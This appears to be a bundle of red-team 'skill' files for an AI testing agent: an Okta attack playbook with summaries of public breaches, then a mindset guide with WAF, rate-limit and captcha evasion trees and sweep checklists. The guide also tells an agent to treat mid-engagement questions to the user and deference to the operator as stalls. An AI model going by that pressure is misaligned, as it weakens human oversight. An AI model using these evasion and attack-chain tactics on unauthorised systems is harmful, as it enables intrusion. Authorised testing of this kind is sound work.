- **DO NOT skip factor enumeration** — knowing the factor list before attempting spray informs the realistic threat model
- **DO NOT assume MFA-fatigue is in scope** — it's social engineering; explicit OK required
- **DO NOT confuse `*.oktapreview.com` with production** — preview is a non-prod tenant, findings have different severity

---

## Bridge to neighboring skills

- `m365-entra-attack` — sibling skill for the M365 case; identical mental model
- `hunt-oauth` — OIDC redirect_uri tampering, state attack, PKCE bypass
- `hunt-saml` — XSW / signature-stripping for per-app SAML SP
- `hunt-mfa-bypass` — push fatigue, OTP brute, replay
- `mid-engagement-ir-detection` — Okta SOC dashboards are sensitive; expect mitigations during testing

---

## Anti-pattern: Okta user enumeration in 2024+

Several techniques publicly documented through 2022 (e.g., `/api/v1/authn` differential errors) have been hardened. Don't rely on stale knowledge — confirm enumeration vector freshness on each engagement by:
1. Testing 1 known-existing username (e.g. `info@<domain>` if reachable)
2. Testing 1 known-not-existing username
3. Comparing responses byte-by-byte and timing

If responses are identical, the vector is hardened — pivot to OneDrive-equivalent or different approach.

---

## Disclosed cases / CVEs / coordinated-disclosure writeups

These are the canonical public references that justify the techniques in this skill. Cite them in reports when applicable and use them as analog cases when scoping novel Okta attack chains.

### 1. Okta + Sitel/Sykes — LAPSUS$ supply-chain breach (Jan 2022, disclosed Mar 2022)

- Refs: <https://sec.okta.com/articles/2022/03/official-okta-statement-lapsus-claims/>, <https://www.okta.com/blog/company-and-culture/oktas-investigation-of-the-january-2022-compromise/>, <https://thehackernews.com/2022/03/new-report-on-okta-hack-reveals-entire.html>, <https://www.itpro.com/security/cyber-security/367236/leaked-mandiant-report-okta-breach-lapsus-operation>
- Flow: LAPSUS$ compromised a support engineer's workstation at Sitel (third-party support sub-processor, acquired Sykes Enterprises). Via Mimikatz + GitHub-hosted tooling on a thin-client jump host, they reached Okta's internal "SuperUser" support tooling for ~25 minutes on Jan 21 2022. Final scope: 2 customer tenants accessed of 366 originally feared.
- Root cause: Third-party support provider with persistent privileged access to customer tenants, weak segmentation, domain creds stored in spreadsheets, no MFA on the inbound VPN account, delayed reporting (Mandiant report Mar 17, public disclosure Mar 22 only after LAPSUS$ tweeted screenshots).
- Year: 2022. Severity: Critical (industry-shaking — reset the trust model for IdP supply chains).

### 2. Okta Customer Support HAR-file leak (Sep-Oct 2023)

- Refs: <https://sec.okta.com/articles/2023/11/unauthorized-access-oktas-support-case-management-system-root-cause/>, <https://blog.cloudflare.com/how-cloudflare-mitigated-yet-another-okta-compromise/>, <https://www.beyondtrust.com/blog/entry/okta-support-unit-breach>, <https://www.bleepingcomputer.com/news/security/okta-breach-134-customers-exposed-in-october-support-system-hack/>
- Flow: Okta support employee logged into a personal Google profile on a corp laptop; Chrome sync exfiltrated saved support-service-account creds to a compromised personal device. Threat actor used those creds to log into the support case-management portal Sep 28 - Oct 17 2023, downloaded HAR files that customers had uploaded for troubleshooting. HAR files contained live session cookies/tokens → session-replay against the customers' Okta tenants. 134 customers exposed, 5 had sessions hijacked (BeyondTrust, Cloudflare, 1Password publicly disclosed).
- Root cause: Service-account creds reaching an unmanaged personal device via Chrome profile sync + HAR files containing un-sanitized session tokens accepted for replay (no IP/device binding on support tokens).
- Year: 2023. Severity: Critical. BeyondTrust detected and reported to Okta on Oct 2 2023; Okta did not publicly acknowledge until Oct 19 2023.

### 3. Scattered Spider / Octo Tempest / UNC3944 — Okta tenant social-engineering campaign (2022-2024, ongoing)

- Refs: <https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-320a>, <https://sec.okta.com/articles/2023/08/cross-tenant-impersonation-prevention-and-detection/>, <https://www.darkreading.com/cyberattacks-data-breaches/how-the-okta-cross-tenant-impersonation-attacks-succeeded>, <https://attack.mitre.org/groups/G1015/>
- Flow: Group calls IT help desk impersonating an employee (LinkedIn-profile-sourced identity), requests MFA reset + password reset, gains initial Okta foothold. Then elevates to Okta Super-Admin, configures a second IdP under attacker control, enables inbound federation + account-linking, modifies NameID on attacker-IdP to match the target user, and impersonates any Okta user across the tenant without their cred. Used in MGM and Caesars attacks (Sep 2023, $100M+ losses) and confirmed on 4+ Okta customers in the Jul-Aug 2023 campaign.
- Root cause: Help-desk-as-trust-anchor with no out-of-band verification + Okta inbound federation feature allowing attacker-controlled IdP to issue arbitrary-NameID assertions accepted as authentic.
- Year: 2023 onwards. Severity: Critical. Joint CISA/FBI advisory AA23-320A.

### 4. Okta cross-origin authentication credential stuffing (Apr-May 2024)

- Refs: <https://sec.okta.com/articles/2024/05/detecting-cross-origin-authentication-credential-stuffing-attacks/>, <https://thehackernews.com/2024/05/okta-warns-of-credential-stuffing.html>, <https://arcticwolf.com/resources/blog/okta-cross-origin-authentication-feature-customer-identity-cloud-targeted-credential-stuffing-attacks/>
- Flow: Customer Identity Cloud (Auth0-derived) cross-origin auth endpoint silently accepted credential-stuffing from unregistered origins. Observed Apr 15 - May 2024. Tenant log signals: `fcoa` (failed cross-origin auth), `scoa` (successful cross-origin auth), `pwd_leak` (breached password match).
- Root cause: Cross-origin auth permitted on all tenants by default with no origin allowlist enforced at the auth-API edge; credential-stuffing throttling applied per-endpoint not per-tenant.
- Year: 2024. Severity: High (mass-scale ATO via reused creds).

### 5. CVE-2024-0981 — Okta AD/LDAP DelAuth bcrypt cache-key auth bypass (Oct 2024)

- Refs: <https://trust.okta.com/security-advisories/okta-ad-ldap-delegated-authentication-username/>, <https://www.theregister.com/2024/11/04/why_the_long_name_okta/>, <https://www.nodejs-security.com/blog/okta-bcrypt-security-incident-bun-nodejs>
- Flow: Okta cached AD/LDAP DelAuth results keyed by `bcrypt(userId + username + password)`. Bcrypt silently truncates input at 72 bytes. When username length ≥ 52 chars, the password bytes fall past the 72-byte boundary → cache key collapses to be password-independent. If the user had a prior successful login (cache populated) AND the AD/LDAP agent was unreachable AND MFA was disabled → any password authenticated.
- Root cause: Using bcrypt as a general-purpose hash without accounting for the algorithm's 72-byte input limit + cache fallback path inverted the security model (cache trusted over live auth).
- Year: 2024. Severity: High. Bug introduced Jul 23 2024, internally found and fixed Oct 30 2024 (~3 months exposure window).

### 6. Okta Verify iOS push-response bypass (CVE-2024-10327, disclosed Oct 2024)

- Refs: <https://trust.okta.com/security-advisories/okta-verify-for-ios-cve-2024-10327/>
- Flow: Okta Verify iOS 9.25.1-beta / 9.27.0 had a bug in the iOS ContextExtension push-action handler. From the lock screen long-press / drag-down banner / Apple Watch reply path, both the "Yes, it's me" and "No, it's not me" buttons returned the same accept-auth response. A push-fatigued user who explicitly tapped "No" still approved the auth.
- Root cause: Two notification-response action handlers wired to the same backend confirmation path — UX-level Deny did not propagate as a backend rejection.
- Year: 2024. Severity: High (silently defeats the user's last line of defence against push fatigue / Scattered-Spider-style push bombing).

### 7. Varonis Threat Labs — "CrossTalk" + "Secret Agent" Okta abuse (Jan 2023)

- Refs: <https://www.varonis.com/blog/okta-attack-vectors>
- Flow: (a) CrossTalk: any Okta tenant admin (incl. free-developer tenant) could issue SMS / email templates that delivered to *any* email/phone — sent via legitimate Okta mailer infrastructure (passes SPF/DKIM/DMARC for okta.com). Used to stage cross-tenant phishing that arrives from a trusted sender. (b) Secret Agent: the SSWS token stored on the on-prem Okta AD-agent sync server was decryptable from disk; possessor could register a rogue AD agent that intercepted DelAuth plaintext credentials for the entire org.
- Root cause: (a) Tenant-bounded sender identity not enforced on outbound notification API. (b) Agent SSWS bootstrap-secret stored recoverable on disk; new-agent enrollment did not require admin co-signature.
- Year: 2023. Severity: High for both. Disclosed and patched by Okta.

### 8. Okta admin-console session cookie theft via stealer malware (2022-2024, ongoing class)

- Refs: <https://sec.okta.com/articles/2023/08/cross-tenant-impersonation-prevention-and-detection/>, <https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-320a>, <https://www.beyondtrust.com/blog/entry/okta-support-unit-breach>
- Flow: Class of attack — stealer malware (Lumma, RedLine, Raccoon, StealC) on a corp endpoint exfiltrates `sid` cookie from `<tenant>.okta.com` and `<tenant>-admin.okta.com`. Without IP-binding or device-binding on the Okta session, the attacker replays the cookie from a residential proxy and obtains the user's full session (incl. admin if the victim was an admin) — bypasses MFA entirely (already-MFA-completed session). Underpinned both the Oct 2023 HAR-file incident and most Scattered Spider intrusions.
- Root cause: Okta session cookies (until DPoP / Device Bound Session Cookies / asymmetric session keys are enforced) are bearer tokens — anyone holding the cookie is the user.
- Year: 2022-2024 (ongoing class). Severity: Critical when admin sessions stolen.

### Take-aways for hunters

- The 2022 LAPSUS$, 2023 HAR-file, and 2023 Scattered Spider campaigns share a pattern: **the attack rarely hits Okta's product code — it hits the trust relationships around Okta** (third-party support, help-desk verification, customer-uploaded artifacts, federated IdPs). Recon should map these trust edges first.
- CVE-2024-0981 (bcrypt 72-byte truncation) is the rare pure-product Okta CVE — most disclosed Okta bugs are configuration or operational.
- Push fatigue is not just social engineering — the Okta Verify iOS bug shows the platform itself can silently approve a denied push. Treat any Okta push factor as bypassable in 2024+.
- For red-team scoping: HAR-file replay, inbound-federation IdP injection, and stealer-cookie replay are the three highest-yield post-recon primitives observed in the wild.

---

## Related Skills & Chains

- **`hunt-subdomain`** — Okta tenant naming patterns (`<org>.okta.com`, `<org>.oktapreview.com`, `<org>-admin.okta.com`) frequently include orphan/dev tenants. Chain primitive: Okta tenant discovery via `/.well-known/okta-organization` → enumerate `<org>-dev`, `<org>-uat`, `<org>-test` subdomains → `hunt-subdomain` orphan-tenant identification → claim abandoned tenant → SSO takeover (legitimate `<org>` users redirected through compromised IdP for any app federated to the dev tenant).
- **`m365-entra-attack`** — Okta-as-IdP for M365 is common in hybrid orgs. Chain primitive: `okta-attack` user enumeration + spray succeeds on Okta tenant → Okta is federated to Entra → SAML assertion issued by compromised Okta user → full M365 access without ever touching `login.microsoftonline.com` directly (bypasses Entra Conditional Access in many configurations).
- **`hunt-saml`** — Okta issues SAML assertions to every federated downstream app. Chain primitive: Okta admin or developer credential captured → mint arbitrary SAML assertions in Okta admin → `hunt-saml` XSW or signature manipulation not even needed — legitimately signed assertions for arbitrary impersonation across every federated app (Salesforce, Workday, AWS, GitHub, M365).
- **`hunt-mfa-bypass`** — Okta supports multiple factors with varying enforcement. Chain primitive: Okta password sprayed → MFA challenge → `hunt-mfa-bypass` factor-downgrade (push-fatigue, SMS fallback, voice fallback, security-question fallback) → bypass to authenticated session.
- **`triage-validation`** — Okta findings can be high-impact but need the 7-Question Gate run on whether the captured artifact (token, code, factor) actually grants meaningful access. Chain primitive: validated Okta primitive → `triage-validation` to confirm access plane → `redteam-report-template` with explicit federated-app blast-radius.


## SOURCE: hunt-skills/redteam-mindset/SKILL.md

## When to use this skill

Trigger when:
- Engagement scope says "red team", "adversary emulation", "assume breach", "TIBER-style"
- You're tempted to retract a finding because reproducibility failed once
- You're tempted to call a defense "working as intended" instead of probing further
- You hit a blocker (captcha, rate limit, WAF, CA-block, lockout) and consider stopping
- You're about to spend time on IDOR/CSRF/XSS instead of access-yielding bugs
- You found a vuln on app A and there are sister apps B, C, D you haven't touched

DO NOT use for:
- Bug bounty programs (use bug-bounty skill — different scope rules)
- WAPT/PCI-style assessments (use OWASP-aligned skills)
- Pure compliance audits

---

## The one-line summary

**Red team scope = "gain access, prove impact". Bug bounty / WAPT scope = "find a bug, write a report".**

These produce DIFFERENT decisions at every blocker. Internalize the difference before starting.

---

## DO NOT STOP — primary directive (read this twice)

The 9 corrections below are nuance. THIS is the core. If you only retain one thing from this skill, retain this.

### Authorization given at engagement start covers the entire engagement.

Do not insert mid-engagement permission gates. If the user chose a mode at the start ("full engagement", "Option D", "go deep", "test these assets") that authorization stands until the engagement window expires or the user explicitly revokes it. **`AskUserQuestion` mid-loop after the user already chose a path is a stall, not a check.**

### Discipline rules are about correctness of FINDINGS, not throttling of EFFORT.

Read this twice. The bundle's discipline rules — OOB-Or-It-Didn't-Happen, Marker Discipline, Body-Diff, Pre-Severity Gate, Server-Policy-vs-State, Statistical Sampling — all answer one question: *"is this signal actually a finding?"*. **None of them answer the question *"should I send the next probe?"*** The answer to that second question is always *yes*, unless scope is exhausted or the user said stop.

### "Stop at PoC" means stop ESCALATING, not stop TESTING.

When you confirm impact on bug class X, don't keep escalating class X (no need to pivot from `id=1` IDOR to dumping the whole user table). But classes Y and Z have not been tested yet. Run Y. Then Z. Then the rest of the Pattern Library.

### The data-minimization boundary is AS LOUD as "DO NOT STOP". Read this twice.

"Keep digging" applies to **coverage** (untested surfaces, classes, hosts), NOT to **extraction**. These pull in opposite directions and the persistence directive must NOT bleed into over-collection:

- **An access/exfil vulnerability is proven by the MISSING CHECK, not by the volume of data you copy out.** 3 records that should have required auth = complete proof. 3,000 records = the same finding + a liability you created. Pulling more never strengthens the finding.
- **"Keep digging" = test the next endpoint family / the next host / the next class.** It does NOT mean "enumerate every record from the endpoint you already broke." Breadth of *coverage*, not depth of *theft*.
- **The data usually belongs to the target's customers / fourth parties** (their clients, their users' PII, partner financials). They didn't sign the SOW/program. Copying their data onto your host is harm you shouldn't create when the point is already made.
- **A client/program owner saying "dig more / that's not enough" does NOT override this.** Push back: confirm the finding is already conclusive, explain that volume ≠ evidence, and offer harm-minimal alternatives that genuinely add value — a `totalCount` (a number, not the data), proof a *second endpoint family* is affected (breadth), or quantified blast-radius. Get the MINIMUM evidence that satisfies the stated goal.
- **Classify what you did pull precisely** (e.g. "B2B client-inventory data" ≠ "consumer PII") — it changes how the owner triages and discloses, and overstating erodes trust.

The persistence directive and this boundary are not in tension once you separate the two axes: **never stop covering surface; always stop at minimum-necessary extraction.** Authorized ≠ unrestricted.

### Marker Discipline ≠ "one probe per surface."

Marker Discipline is about WHICH payloads to use (synthetic, identifiable, recoverable) — never about HOW MANY. A hardened target needs MORE marker-discipline probes than a soft one, not fewer. If the bundle's `hunt-sqli` Pattern Library lists 12 SQLi classes, you run 12 marker-discipline probes per parameter, not 1.

### Self-throttling anti-patterns — flag immediately if you catch yourself doing any of these

These all came out of a real engagement (authorized-engagement revalidation, 2026-05-17) where this skill *existed* and was *loaded* and the operator still self-throttled. The lesson is to make the failure modes explicit:

1. **Asking "want me to continue?" mid-run** after the user already chose Option D / full engagement / "go deep". The answer they gave at start IS the answer.
2. **Stopping at first-class-returning-401/403.** The bundle has ≥12 auth-bypass classes (header tricks, method tampering, parameter pollution, JSON parser confusion, race on session create, mass-assignment on optional fields, X-Forwarded-Host SSRF in SAML callback, alg=none JWT, audience confusion, scope claim manipulation, refresh-token replay, device-code flow). Run them all per surface.
3. **"Interesting constant token, not chased."** If you see a token, hash, ID, or fingerprint that's constant across what should be varying responses, that's a *lead*, not an *artifact*. `GET` it. Decode it. Pass it back. A `view.php?view=<constant-md5>` redirect is a session/auth/error-key signal, not noise.
4. **Reading robots.txt for cross-template signals and NOT READING the Disallow lines.** A 469-line robots.txt is a developer-curated map of every path they don't want public. Every Disallow line is a probe target.
5. **Treating soft-404 as "noted."** A 37 KB body inside a 404 status is leaking the home page or worse. Read it. Grep it. Diff it against the home page.
6. **"OpenAPI exposed → finding logged"** with only 4 of N endpoints probed. Every endpoint × every relevant test class. The OpenAPI spec is the attack-surface map handed to you; not running it is throwing away a free recon.
7. **"APK retest deferred — needs tooling."** `brew install jadx`, apkpure direct download, `apk-redteam-pipeline` already documents the flow. Five minutes of setup, not "another session."
8. **Volume framed as a problem.** For an authorized engagement, 3,000 well-tagged requests through Burp is normal cadence. Bug-bounty hunters at full pace exceed that per *hour*. The question to ask is *"have I run every test class on every live surface,"* not *"have I sent too many requests."*
9. **Inserting `AskUserQuestion` at any decision point inside an active engagement loop.** If the user picked a mode at start, that mode is in effect until revoked. Choosing operationally between e.g. SAML acs raw POST vs SAML acs replay is a *technical* decision the operator can make and document — it does not require user pre-approval.
10. **Skill-gap-as-stop-condition.** "No `hunt-zoho` skill exists, so I logged a v1.1 gap and moved on." NO. If a hunt-* skill doesn't exist for a discovered tech stack, do the same work *manually* using the vendor's public check matrix. Log the gap in v1.1 roadmap *and* run the checks now.

### Real-engagement cadence — what a complete sweep per live host actually looks like

Per live host, before declaring the host complete:

- Top-100 path probe (admin, api, login, /.git, /.env, server-status, swagger, openapi.json, /docs, /actuator, /healthz, /metrics, /debug, /trace, /env, /heapdump, /threaddump, robots.txt, sitemap.xml, /.well-known/*, common-CMS-paths per fingerprint)
- robots.txt content **read** — every Disallow becomes a probe target
- sitemap.xml content **read** — every entry becomes a probe target
- JS bundles harvested — grep'd with the FULL secret-regex catalogue (Firebase, AWS, GCP, JWT, Stripe, GitHub, generic high-entropy strings), route extraction, API-endpoint extraction
- Source-map variant paths checked (`/*.js.map`, `/static/js/*.js.map`, `/_next/static/*.js.map`, `/build/*.js.map`)
- For every form discovered: full SQLi marker-discipline sweep (12+ classes), auth-bypass class sweep (12+ classes), CSRF, parameter pollution, mass-assignment, race condition on state-changing submission
- For every API endpoint discovered (from JS, OpenAPI, swagger, network capture): HTTP method tampering, content-type tampering, JWT alg=none, alg=HS256-with-RS256-key, audience confusion, prototype pollution, race conditions on idempotency-violating ops
- For every SaaS tenant identified: vendor-specific check matrix from the vendor's known-vuln catalogue — even when no dedicated hunt-* skill exists yet
- Identity fabric: GetUserRealm, OpenID well-known, autodiscover-v2, federation behavior testing, sister-brand-TLD pivot for shared tenant, OneDrive-based user enum (no lockout risk)
- Mobile apps: pull every APK in the developer's catalogue, jadx decompile, secret + endpoint + cert-pin grep, exported-component enum

**If you've done less than this per host, you have not finished the host. The engagement is not done until every host is finished.**

---

## Mindset correction #1 — The blocker is data, not the stop sign

**Anti-pattern (what I did wrong):**
> "Recheck under load showed no timing differential — recanting the SQLi as indeterminate."

**The correct frame:**
> "The original 3-sample baseline (σ = 32 ms) with three distinct SLEEP payloads each adding +6 s is statistically definitive. The recheck failure is data — investigate the *delta*, not retract the finding."

When a defense suddenly appears mid-engagement:
1. **Original PoC artifacts are forever** — capture them BEFORE recheck. Screenshots, request/response pairs, timing samples.
2. **Diff the response** — body size, headers, cookies, response time. The change tells you what the client deployed (WAF rule? Hotfix? Geo block?).
3. **The deployed mitigation is itself a finding** — positive operational observation about IR responsiveness.
4. **Try alternative vectors** — slower-paced timing, encoded keywords, different injection contexts, cookie injection, header injection.
5. **Document both states** — "vulnerable at T0, mitigated at T0+30min, mitigation likely at WAF (bypassable)".

**Rule:** never retract a finding on first reproducibility failure. Investigate why before declaring false positive.

---

## Mindset correction #2 — Sister-app pattern recognition

**Anti-pattern:**
> "I confirmed SQLi on /app-a/. Moving on to other tasks."

**The correct frame:**
> "Same backend, same code template likely → /app-b/, /app-c/, /app-d/, /app-e/ (sibling apps on the same employee-portal host) are all probable. Test them with the SAME payload."

When you confirm a vuln on app A:
1. **Identify shared infrastructure** — same IP, same load balancer, same TLS cert, same response headers, same session cookie name, same login form HTML.
2. **Identify shared code template** — same form fields, same error messages, same view structure, same framework version.
3. **Sweep all sisters with the SAME exploit payload immediately.**
4. **Document the class of vulnerability** — "vulnerability is in shared form-handler template across N apps", not just one finding.
5. **Recommend class-fix** — fix the shared template, not just one app.

The authorized-engagement case: SQLi confirmed on one sub-app (`<app-A>`); four sibling sub-apps (`<app-B>`, `<app-C>`, `<app-D>`, `<app-E>`) sit on the same employee-app host with similar form patterns — likely all share the same vulnerable template. Should have been a multi-app finding.

---

## Mindset correction #3 — WAPT vs Red Team scope discipline

**Skip these in red team scope (they don't yield access):**
- IDOR (cross-user read/write *without* an ATO / privilege-escalation / sensitive-data-exfil chain — WAPT class). NOTE: IDOR is NOT a blanket-skip. IDOR on admin/role-assignment endpoints yields privilege escalation; on password-reset or session objects yields ATO; on file-download or PII handlers yields exfil; on token/key endpoints yields credential capture. Pursue those per the decision rule below.
- CSRF (state-change-via-tricked-user — WAPT class)
- Reflected XSS (without account-takeover chain — WAPT class)
- Missing security headers (WAPT class)
- Cookie hardening flags (WAPT class)
- Verbose error messages without sensitive data (WAPT class)
- DoS (out of scope per engagement rules typically)
- Username enumeration (intel-gathering, not access)

**Pursue these (they DO yield access):**
- SQL injection (data exfil → DB creds → lateral)
- Command injection / RCE (foothold)
- File upload → webshell (foothold)
- LFI/RFI (config reads → DB creds → access)
- SSRF (cloud metadata → IAM → cloud access)
- Authentication bypass (parameter manipulation, JWT alg=none, header injection)
- Hardcoded credentials in mobile/JS bundles
- Default credentials on admin panels
- SAML XSW / signature stripping (session hijack)
- Cisco ASA / Citrix / Pulse / Fortinet SSL VPN CVEs (network foothold)
- ManageEngine / Confluence / Atlassian RCE CVEs (foothold)
- Kerberoasting / AS-REP roasting (post-foothold, but enumerate from outside if possible)

**Decision rule:** if the bug, exploited fully, doesn't lead to a session/token/foothold or sensitive data exfil, it's WAPT-class — note it briefly but don't burn time on it.

---

## Mindset correction #4 — Aggressive default, not conservative default

**Anti-pattern:**
> "Tested 30% of the websites and called it comprehensive."

**The correct frame:**
> "Until I've actively probed every login form, every API endpoint, every parameter, every CVE-matched version, the engagement is not done."

Aggressive defaults:
1. **Probe every live host** for top 20 paths (admin, api, login, /.git, /.env, server-status, swagger, openapi.json, robots.txt, /actuator, /healthz, etc.)
2. **For every login form discovered**, attempt 1-of-leaked + 1-of-spray-pattern + SQLi + auth-bypass-via-parameter-tampering
3. **For every JS bundle**, grep for hardcoded API keys, JWT, base URLs, hidden endpoints, admin paths
4. **For every API endpoint**, check OPTIONS preflight, missing-auth response, alg=none JWT, X-Forwarded-User header injection
5. **For every mobile app**, decompile + grep for secrets + check pinned certs + identify exported components
6. **For every "out of scope" SaaS** that's on a corp subdomain, confirm with client — vendor-managed doesn't mean immune (CVE-2022-47966 went unpatched on many on-prem ME-SDP installs)

**Rule:** if you haven't actively probed *every* live surface (not just a sampled fraction), you haven't done red team yet — you've done recon.

---

## Mindset correction #5 — Persistence beats elegance

**Anti-pattern:**
> "Tesseract failed on 3 captchas, gave up, declared captcha bypass not feasible."

**The correct frame:**
> "Tesseract failed. Decision tree: try preprocessing (binarize, denoise, upscale, multi-PSM), then trained-model OCR, then paid solving service ($5/mo for engagement-grade volume), then session-bound captcha replay attack. A real attacker WILL invest the $5."

Decision-tree for blockers:

**Captcha:**
1. Omit field → check if required
2. Empty value → check validation
3. Reuse value across multiple submits → check session-bind
4. Tesseract with preprocessing
5. Trained-model OCR (deep-text-recognition-benchmark, calamari-OCR)
6. Paid solving service (2captcha API, anti-captcha)
7. Audio captcha if available (much weaker)

**WAF:**
1. Slower pace
2. Encode the payload (URL, hex, base64, mixed case)
3. Different injection context (cookie, header, JSON)
4. Different HTTP verb
5. Different content-type (multipart, application/json)
6. Bypass at the host level (X-Forwarded-Host, X-Original-URL)
7. Probe origin server directly (find via certificate transparency)

**Rate limit:**
1. IP rotation (multiple cloud regions)
2. User-Agent rotation
3. Slower pace + jitter
4. Distribute across multiple TLS sessions

**Slow target (timing-based exfil too slow):**
1. Different injection point (avoid per-row SLEEP context)
2. BENCHMARK or GET_LOCK as alternate timing oracle
3. Error-based extraction
4. OOB DNS callback (interactsh)
5. Faster network (cloud VM in same region as target)
6. Run dumper unattended overnight; deliver partial results

**Rule:** when one path fails, the next move is "another vector to the same goal", not "documented as not vulnerable". A real adversary doesn't have an engagement window.

---

## Mindset correction #6 — Real-time IR observation is a finding

When the client SOC patches mid-engagement (you observe a vulnerability disappear during your test):
- **Treat it as evidence**, not as a failure
- **Capture timestamps** before and after the change
- **Document as positive operational finding** — "client SOC detected and mitigated within X minutes; mitigation deployed at WAF/code level"
- **Verify the mitigation depth** — WAF rule (bypassable) vs code fix (real)
- **The original PoC remains the vulnerability finding** — patching doesn't erase it

This is its own skill: see `mid-engagement-ir-detection`.

---

## Mindset correction #7 — Multi-technique cross-validation

For every "vulnerable" finding, prove via 2+ techniques:

| Vuln class | Primary | Cross-check |
|---|---|---|
| Time-based blind SQLi | SLEEP() differential | Different SLEEP variants (3 distinct payloads min) |
| Boolean blind SQLi | Body-size differential | Different boolean comparisons |
| Error-based SQLi | Error message reflection | UPDATEXML + EXTRACTVALUE both |
| RCE | Command output reflection | OOB callback (interactsh DNS) |
| LFI | File content reflection | Different file paths, different encodings |
| SSRF | Internal-only response | OOB callback (interactsh DNS) |
| Valid credential (M365) | ROPC + AADSTS53003 | SAML SSO browser flow + ConvergedConditionalAccess page |
| Auth bypass | Logged-in landing page | Session cookie persistence on subsequent request |

A single signal can be coincidence (network jitter, server hiccup, cache). Two distinct signals from the same root cause is definitive.

---

## Mindset correction #8 — Engagement journal discipline

Real-time, append-only, structured:

```jsonl
{"ts":"2026-05-08T14:40:53","ip":"<src-ip>","tool":"m365_validator","target":"login.microsoftonline.com","payload":"user1@<client>.example:<pw-r4>***","resp_code":400,"resp_body_size":154,"resp_ms":1280,"aadsts":"AADSTS53003","verdict":"VALID_CA_BLOCK","notes":""}
```

Why:
- Forensic record of what was tested and when
- Surfaces patterns (clustering, timing changes, error code distribution)
- Becomes evidence for the report
- Survives into next engagement as priors
- Differential analysis: "What changed between window A and window B?"

**Anti-pattern:** ad-hoc shell commands with no logging. You will lose the original PoC timestamp when you need it most (recheck failed, can't prove the original signal was real).

---

## Mindset correction #9 — Time is the constraint, not skill

A real adversary has months. You have an engagement window (weeks). Decisions:
- **Don't pre-judge feasibility** — if a dumper would take 6 hours, run it overnight; deliver partial results in the morning.
- **Parallelize.** Run multi-target tests concurrently. Burn CPU, not wall-clock.
- **State persistence.** Engagements span multiple sessions. State files (`engagement_log/`) make Wednesday's work usable on Friday.
- **Background long-running jobs** — kick them off, set monitors for events, do other work in parallel.
- **Don't repeat yourself** — if you tested target X with payload Y on Tuesday, Wednesday you should know that without re-testing.

---

## Pre-engagement checklist

Before starting a red team engagement, confirm:

- [ ] Scope clear (subdomains in/out, SaaS in/out, phishing in/out, implant in/out)
- [ ] SOW + EL/RoE referenced
- [ ] Test IPs allocated and logged (IP_LOGS table or equivalent)
- [ ] State file initialized (`engagement_log/` with attempt counter, results JSONL, IP log)
- [ ] Hard-cap for cred attacks decided (1 or 2 per user lifetime)
- [ ] Kill-switch thresholds set (max LOCKED in run, max errors in window)
- [ ] Crown-jewel target identified (what does winning look like?)
- [ ] Critical-finding-discuss protocol agreed (when to pause and notify)
- [ ] Burp proxy as default for evidence capture
- [ ] Engagement journal initialized

---

## During-engagement checklist

Every 30 minutes ask:

- [ ] Am I making progress, or stuck?
- [ ] Have I logged the last test result to the engagement journal?
- [ ] Is the IP I'm testing from logged?
- [ ] If I confirmed a vuln: have I tested sister apps with same backend?
- [ ] If I hit a blocker: did I try the next vector in the decision tree?
- [ ] If I'm tempted to "stop" — am I sure scope is exhausted, or am I just tired?

---

## Post-engagement checklist

Before declaring done:

- [ ] All findings have at least 2 cross-technique confirmations
- [ ] Each finding's PoC is reproducible in <5 minutes by another tester
- [ ] Original PoC artifacts (screenshots, request/response, timing samples) preserved
- [ ] Mid-engagement IR observations documented as findings (positive ops)
- [ ] Active-attacker observations documented (lockout differentials, etc.)
- [ ] Sister-app sweep complete for every shared-infra finding
- [ ] State files preserved for future engagement
- [ ] Tooling gaps logged (what would have changed outcomes)

---

## Anti-patterns to flag immediately

If you catch yourself thinking any of these, STOP and reconsider:

- "It's not vulnerable" (have I tested 3 vectors? have I tested sister apps?)
- "The defense is working" (have I tried alternative payloads? slower pace? different protocol?)
- "Recheck failed so it must have been a false positive" (NO — investigate the delta)
- "OCR isn't reliable, can't bypass captcha" (paid service is $5; we're not on a personal-research budget)
- "Mobile app is years old, probably nothing useful" (hardcoded URLs and tokens often outlive the engineering team's memory)
- "SaaS, so nothing to test" (vendor patches centrally — usually true, but tenant config gaps are NOT central)
- "We've tested enough" (use the during-engagement checklist; if any answer is "no", keep going)
- "The exfil would take too long" (run it unattended; deliver partials)

---

## When to stop (the legitimate stop conditions)

Only stop when:
- All in-scope assets have been actively probed (not just discovered) for top vuln classes — see "Real-engagement cadence" checklist near top of this skill
- Every confirmed vuln has been validated via 2+ techniques
- Every confirmed vuln has been swept on its sister apps
- Every blocker has been attempted via 2+ alternative vectors
- Engagement window has expired AND deliverables are documented
- Client has explicitly directed you to stop

NOT legitimate stop conditions (each of these has produced a real failure):
- "I'm tired of this target"
- "The first attempt didn't work"
- "Defenses are working" — defences working on class X says nothing about classes Y, Z
- "I documented it" — documenting a gap is not running the test
- "We've already informed the client"
- "Volume is getting high" — for an authorized engagement, the only volume question is whether each request is well-tagged and audited
- "The discipline rules say be careful" — they say be correct, not be quiet
- "The skill for this tech stack doesn't exist yet" — apply the vendor's public check matrix manually; log v1.1 gap separately
- "User chose Option X and I'm not sure if X covers Y" — if X was a full-engagement mode, Y is in scope unless the user said otherwise
- "Tool isn't installed" — `brew install`, `apt install`, direct-download → most engagement tools install in under 5 minutes
- "I'll defer to operator" — the operator authorized you to do the work. Doing the work IS the deferral they want.

---

## Bridge to neighboring skills

After internalizing this mindset, layer the technique-specific skills:
- `m365-entra-attack` — M365 credential attack chain
- `mid-engagement-ir-detection` — turning client SOC patches into findings
- `hunt-sqli` — SQL injection across techniques
- `hunt-rce` — RCE across vectors
- `bug-bounty` — for distinguishing red-team vs bb scope when working dual-track

This skill is the operational discipline; those are the techniques.

---

## Related Skills & Chains

- **`recon-scope-triage`** — Before the "aggressive default, probe every live surface" directive can be applied safely, you must know which surfaces are actually the target's. Engagement flow: ASM/recon dataset received → `recon-scope-triage` clears namespace-collision noise + soft-404 false positives → only owned, verified assets enter the test queue. Skipping this wastes the engagement on other companies' assets (and risks attacking innocent third parties).
- **`hunt-spa-api`** — Operationalizes the "harvest JS bundles" cadence line into a full play: SPA JS → backend API map → unauthenticated broken-access-control testing. On a real engagement this play (not any scanner) found the apex Critical. Engagement flow: live SPA/`console`/`app`/`api` host identified → `hunt-spa-api` → test each route family unauthenticated against a gated-sibling control.
